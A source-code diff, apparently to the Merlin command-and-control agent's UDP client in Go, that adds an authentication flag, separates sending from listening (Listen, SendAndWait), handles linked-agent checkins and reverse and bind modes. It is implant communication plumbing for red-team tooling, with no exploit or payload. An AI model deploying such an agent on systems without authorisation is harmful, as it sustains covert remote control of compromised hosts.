@@ -58,6 +58,7 @@ const (
 type Client struct {
 	address       string                       // address is the network interface and port the agent will bind to
 	agentID       uuid.UUID                    // agentID the Agent's UUID
+	authenticated bool                         // authenticated tracks if the Agent has successfully authenticated
 	authenticator authenticators.Authenticator // authenticator the method the Agent will use to authenticate to the server
 	client        net.Addr                     // client is the address of the UDP client that initiated the connection, returned from PacketConn.ReadFrom
 	connection    net.Conn                     // connection the network socket connection used to handle traffic
@@ -208,6 +209,7 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 
 		// Once authenticated, update the client's secret used to encrypt messages
 		if authenticated {
+			client.authenticated = true
 			var key []byte
 			key, err = client.authenticator.Secret()
 			if err != nil {
@@ -219,18 +221,25 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 			}
 		}
 
-		// The "none" authenticator will return an empty Base message while an OPAQUE message will return type OPAQUE 2
-		if msg.Type != 0 {
+		if msg.Type == messages.OPAQUE {
 			// Send the message to the server
 			var msgs []messages.Base
-			msgs, err = client.Send(msg)
+			msgs, err = client.SendAndWait(msg)
 			if err != nil {
 				return
 			}
 
 			// Add response message to the next loop iteration
 			if len(msgs) > 0 {
-				msg = msgs[0]
+				// Don't add IDLE messages, just continue on
+				if msgs[0].Type != messages.IDLE {
+					msg = msgs[0]
+				}
+			}
+		} else {
+			_, err = client.Send(msg)
+			if err != nil {
+				return
 			}
 		}
 
@@ -319,6 +328,64 @@ func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
 	return messages.Base{}, fmt.Errorf("clients/udp.Deconstruct(): unable to transform data into messages.Base structure")
 }
 
+func (client *Client) Listen() (returnMessages []messages.Base, err error) {
+	cli.Message(cli.DEBUG, "Entering into clients/udp.Listen()")
+
+	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s at %s...", client.client, time.Now().UTC().Format(time.RFC3339)))
+
+	respData := make([]byte, 500000)
+	readTimeout := time.Minute * 5
+	var n int
+
+	switch client.mode {
+	case BIND:
+		n, client.client, err = client.listener.ReadFrom(respData)
+	case REVERSE:
+		err = client.connection.SetReadDeadline(time.Now().Add(readTimeout))
+		if err != nil {
+			cli.Message(cli.DEBUG, fmt.Sprintf("clients/udp.Listen(): there was an error setting the connection read deadline to 5 minutes: %s", err))
+		}
+		n, err = client.connection.Read(respData)
+	}
+
+	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", n, client.client, time.Now().UTC().Format(time.RFC3339)))
+	if err != nil {
+		switch err2 := err.(type) {
+		case net.Error:
+			if err2.Timeout() {
+				err = fmt.Errorf("clients/udp.Listen(): The UDP connection read time of %s was reached: %s", readTimeout, err)
+				return
+			}
+		default:
+			err = fmt.Errorf("clients/udp.Listen(): there was an error reading the message from the connection with %s: %s", client.client, err)
+		}
+		return
+	}
+
+	var msg messages.Base
+	msg, err = client.Deconstruct(respData[:n])
+	if err != nil {
+		err = fmt.Errorf("clients/udp.Listen(): there was an error deconstructing the data: %s", err)
+		cli.Message(cli.DEBUG, err.Error())
+		// See if the data was from initial link command from another agent
+		b64 := make([]byte, base64.StdEncoding.EncodedLen(n))
+		_, errBase64 := base64.StdEncoding.Decode(b64, respData[:n])
+		if errBase64 == nil {
+			cli.Message(cli.INFO, fmt.Sprintf("Received Base64 encoded string from %s. Treating as a new connection...", client.client))
+			// Send gratuitous checkin to provide parent Agent with linked agent data
+			if client.authenticated {
+				_, err = client.Send(messages.Base{ID: client.agentID, Type: messages.CHECKIN})
+			}
+			return
+		}
+		return
+	}
+
+	//fmt.Printf("Received message: %+v\n", msg)
+	returnMessages = append(returnMessages, msg)
+	return
+}
+
 // Send takes in a Merlin message structure, performs any encoding or encryption, converts it to a delegate and writes it to the output stream
 // The function also decodes and decrypts response messages and return a Merlin message structure.
 // This is where the client's logic is for communicating with the server.
@@ -379,64 +446,23 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 
 	cli.Message(cli.DEBUG, fmt.Sprintf("Wrote %d bytes to connection %s at %s", n, client.client, time.Now().UTC().Format(time.RFC3339)))
 
-	// Wait for the response
-	cli.Message(cli.NOTE, fmt.Sprintf("Waiting for response from %s at %s...", client.client, time.Now().UTC().Format(time.RFC3339)))
-
-	respData := make([]byte, 500000)
-	readTimeout := time.Minute * 5
-
-	switch client.mode {
-	case BIND:
-		n, client.client, err = client.listener.ReadFrom(respData)
-	case REVERSE:
-		err = client.connection.SetReadDeadline(time.Now().Add(readTimeout))
-		if err != nil {
-			cli.Message(cli.DEBUG, fmt.Sprintf("clients/udp.Send(): there was an error setting the connection read deadline to 5 minutes: %s", err))
-		}
-		n, err = client.connection.Read(respData)
-	}
-
-	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", n, client.client, time.Now().UTC().Format(time.RFC3339)))
-	if err != nil {
-		switch err2 := err.(type) {
-		case net.Error:
-			if err2.Timeout() {
-				err = fmt.Errorf("clients/udp.Send(): The UDP connection read time of %s was reached: %s", readTimeout, err)
-				return
-			}
-		default:
-			err = fmt.Errorf("clients/udp.Send(): there was an error reading the message from the connection with %s: %s", client.client, err)
-		}
-		return
-	}
-
-	var msg messages.Base
-	msg, err = client.Deconstruct(respData[:n])
-	if err != nil {
-		err = fmt.Errorf("clients/udp.Send(): there was an error deconstructing the data: %s", err)
-		cli.Message(cli.DEBUG, err.Error())
-		// See if the data was from initial link command from another agent
-		b64 := make([]byte, base64.StdEncoding.EncodedLen(n))
-		_, errBase64 := base64.StdEncoding.Decode(b64, respData[:n])
-		if errBase64 == nil {
-			cli.Message(cli.INFO, fmt.Sprintf("Received Base64 encoded string from %s. Treating as a new connection and re-sending the message...", client.client))
-			// Re-send the original input message
-			returnMessagesNew, errSend := client.Send(m)
-			if errSend != nil {
-				err = fmt.Errorf("clients/udp.Send(): there was an error trying to re-send the message after the response received an init message: %s", errSend)
-				return
-			}
-
-			returnMessages = append(returnMessages, returnMessagesNew...)
-			err = nil
-			return
-		}
-		return
-	}
-
-	//fmt.Printf("Received message: %+v\n", msg)
-	returnMessages = append(returnMessages, msg)
 	return
+}
+
+// SendAndWait takes in a Merlin message, encodes/encrypts it, and writes it to the output stream and then waits for response
+// messages and returns them
+func (client *Client) SendAndWait(m messages.Base) (returnMessages []messages.Base, err error) {
+	cli.Message(cli.DEBUG, "Entering into clients/udp.SendAndWait()...")
+
+	// Send
+	returnMessages, err = client.Send(m)
+	if err != nil {
+		err = fmt.Errorf("clients/udp.SendAndWait(): %s", err)
+		return
+	}
+
+	// Listen
+	return client.Listen()
 }
 
 // Get is a generic function that is used to retrieve the value of a Client's field
@@ -459,7 +485,13 @@ func (client *Client) Set(key string, value string) error {
 	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
 	var err error
 	switch strings.ToLower(key) {
-
+	case "listener":
+		var id uuid.UUID
+		id, err = uuid.FromString(value)
+		if err != nil {
+			return fmt.Errorf("clients/udp.Set(): %s", err)
+		}
+		client.listenerID = id
 	case "paddingmax":
 		client.paddingMax, err = strconv.Atoi(value)
 	case "secret":
@@ -479,5 +511,16 @@ func (client *Client) String() string {
 		return "udp-reverse"
 	default:
 		return "udp-unhandled"
+	}
+}
+
+func (client *Client) Synchronous() bool {
+	switch client.mode {
+	case BIND:
+		return true
+	case REVERSE:
+		return true
+	default:
+		return false
 	}
 }
